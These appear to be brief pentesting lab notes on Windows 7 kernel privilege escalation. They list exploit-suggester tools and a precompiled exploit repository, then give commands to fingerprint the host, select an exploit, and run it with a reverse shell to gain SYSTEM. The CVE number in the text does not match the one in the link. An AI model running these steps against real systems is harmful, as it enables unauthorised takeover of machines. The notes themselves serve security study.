##### Tools
Windows Exploit Suggester:
https://github.com/bitsadmin/wesng
Precompiled Kernel Exploits:
https://github.com/SecWiki/windows-kernel-exploits
Watson: https://github.com/rasta-mouse/Watson

### Privilege Escalation
(Note: These steps are for Windows 7)
1.Extract the output of the systeminfo command:
`> systeminfo > systeminfo.txt`
2.Run wesng to find potential exploits:
`$ python wes.py systeminfo.txt -i 'Elevation of Privilege' --exploits-only | less`
3.Cross-reference results with compiled exploits:
https://github.com/SecWiki/windows-kernel-exploits
4.Download the compiled exploit for CVE-2018-8210 onto
the Windows VM: https://github.com/SecWiki/windows-kernel-exploits/blob/master/CVE-2018-8120/x64.exe
5.Start a listener on Kali and run the exploit, providing it
with the reverse shell executable, which should run with
SYSTEM privileges:
`> .\x64.exe C:\PrivEsc\reverse.exe`
